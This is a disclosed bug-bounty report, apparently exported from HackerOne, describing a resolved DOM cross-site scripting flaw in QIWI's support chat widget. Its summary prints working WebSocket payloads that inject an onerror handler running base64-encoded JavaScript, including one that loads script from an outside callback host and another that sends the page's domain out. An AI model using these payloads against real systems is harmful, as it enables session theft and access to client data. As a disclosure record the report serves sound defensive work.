{"id":512065,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTIwNjU=","url":"https://hackerone.com/reports/512065","title":"DOM XSS triggered in secure support desk","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-03-19T14:08:28.458Z","submitted_at":"2019-03-19T14:08:28.458Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"honoki","url":"/honoki","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":215,"url":"https://hackerone.com/qiwi","handle":"qiwi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"QIWI","twitter_handle":"QiwiRussia","website":"https://qiwi.com","about":"The QIWI brand is a family brand that consolidates several directions: kiosks, wallet, bank and even terminals of goods delivery."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-31T10:06:15.455Z","bug_reporter_agreed_on_going_public_at":"2020-08-12T09:38:04.966Z","team_member_agreed_on_going_public_at":"2020-08-31T10:06:15.363Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-09-11T09:38:05.031Z","allow_singular_disclosure_after":-34147819.29441184,"singular_disclosure_allowed":true,"vote_count":64,"voters":["robindebaets","zonduu","holme","base_64","badcracker","mik317","n4sty","jgu","0nlymohammed","0xatul","and 54 more..."],"severity":{"rating":"critical","score":10.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":18733,"asset_type":"URL","asset_identifier":"*.qiwi.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4352981,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2019-03-19T14:10:50.361Z","updated_at":"2019-03-19T14:10:50.361Z","actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4353510,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2019-03-19T15:52:44.791Z","updated_at":"2019-03-19T15:52:44.791Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4353527,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-03-19T15:54:29.550Z","updated_at":"2019-03-19T15:54:29.550Z","actor":{"url":"/qiwi","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"QIWI"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"qiwi","collaborator":{"username":"honoki","url":"/honoki"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7670914,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-04-15T11:51:54.234Z","updated_at":"2020-04-15T11:51:54.234Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"honoki","url":"/honoki"},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8914253,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-12T09:38:04.996Z","updated_at":"2020-08-12T09:38:04.996Z","first_to_agree":true,"actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9085728,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-31T10:06:15.383Z","updated_at":"2020-08-31T10:06:15.383Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9085729,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-31T10:06:15.479Z","updated_at":"2020-08-31T10:06:15.479Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":24245,"category":"team","content":"##Summary\nDue to insufficient input sanitization, an attacker can send a crafted WebSocket message that will result in arbitrary code execution in the chat support backend, giving an attacker control to support tickets and client information.\n\n##Technical details\nThe vulnerability exists in line `2544` of `https://chat.qiwi.com/widget/ocWidget/src/js/ocWidget.chat.js?ver=1.7.1` when uploaded attachments are included in the DOM of the chat window. In particular, the parameters `media_thumb` and `media_url` are controlled by the attacker, and are not sanitized.\n\nFor example, sending the following payload in an ongoing chat conversation (web socket), leads to successful XSS:\n```javascript\nws.send('{\"action\":\"send_message\",\"data\":{\"type\":2,\"uuid\":\"katO0xuiIy\",\"media_thumb\":\"xxdata\\\\\" onerror=\\\\\"eval(atob(\\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcGl0ci54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7\\'));//\",\"media_url\":\"media-url\"},\"uuid\":\"katO0xuiIy\",\"token\":\"bz+OjfTeBL/BRozszXwKbT10voEb0crFVRWBktvQifQ=\",\"projectId\":1,\"messengerType\":9}')\n```\nNote that the Base64 encoded string translates to:\n```javascript\nvar a=document.createElement(\"script\");a.src=\"https://pitr.xss.ht\";document.body.appendChild(a);\n```\nYou can see the DOM element that will be created by manually executing the RTC().create() function from the console on the homepage https://qiwi.com/main:\n\n```javascript\nRTC().create('div', {id: \"a\",className: 'ocWidget__message ocWidget-message-loading ocAnimation-fadeIn',innerHTML: ocWidget.tpls.sentImage({size: {width: 0, height: 0},src: \"data\\\" onerror=\\\"eval(atob('KG5ldyBJbWFnZSgpKS5zcmM9J2h0dHBzOi8vdC5ob25va2kubmV0Lz8nK2VuY29kZVVSSShkb2N1bWVudC5kb21haW4p'))//\",modal: \"media-url\",date: \"now\"})});\n```\n\nwhich results in the following HTML (snipped):\n\n```html\n\u003cimg draggable=\"false\" class=\"ocWidget-img\" src=\"[...]\" onerror=\"eval(atob('[...]'))//?token=bz%2BOjfTeBL%2FBRozszXwKbT10voEb0crFVRWBktvQifQ%3D\"\u003e\n```\nMy blind XSS was triggered on `` from the following IPs:\n\n```\n176.56.0.107\n95.78.162.97\n```\nSee the attached screenshot illustrating the access of the included XSS payload.\n\nSteps to reproduce\nLog in to https://qiwi.com/main\nClick the \"chat\" button in the lower right corner and wait for the session to be established;\nExecute the following Javascript in your Chrome\n```javascript\nocWidget.websocket.send({\n    \"action\":\"send_message\",\n    \"data\": {\n        \"type\":2,\n        \"uuid\":\"katO0xuiIy\",\n        \"media_thumb\":\"xxdata\\\" onerror=\\\"eval(atob('YWxlcnQoMSk='));//\",\n        \"media_url\":\"media-url\"\n    },\"uuid\":\"katO0xuiIy\"\n})\n```\nNote - this will trigger an alert box at the side of the support desk employee. Replace the payload with a base64-encoded version of a callback to observe the blind callback if preferred.\n\n##Recommendation\nI recommend to not use user-provided input without further sanitization to build dynamic elements on a page.\n\n##Impact\nSuccessful exploitation of the XSS vulnerability could allow an attacker to steal session credentials, perform unauthorized actions in the backend application on behalf of legitimate support employees or spread malware via the Qiwi application. Notably, this vulnerability can give access to sensitive client information that should only be available to staff.\n\nAlso note that this XSS is \"wormeable\", in the sense that the access to support staff could be leveraged to in turn affect Qiwi clients with whom they are having a conversation. I have not attempted to demonstrate that for obvious reasons.\n\nFurthermore, the DOM of the support application Workspace 1.14.1 contains sensitive information of staff, including usernames and hashes. These might be used by attackers to elevate privileges in other applications.\n\n","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":14735,"username":"vankyver","name":"vankyver","bio":null,"cleared":false,"website":null,"location":null,"created_at":"2014-11-28T14:52:45.122Z","url":"https://hackerone.com/vankyver","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"company","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}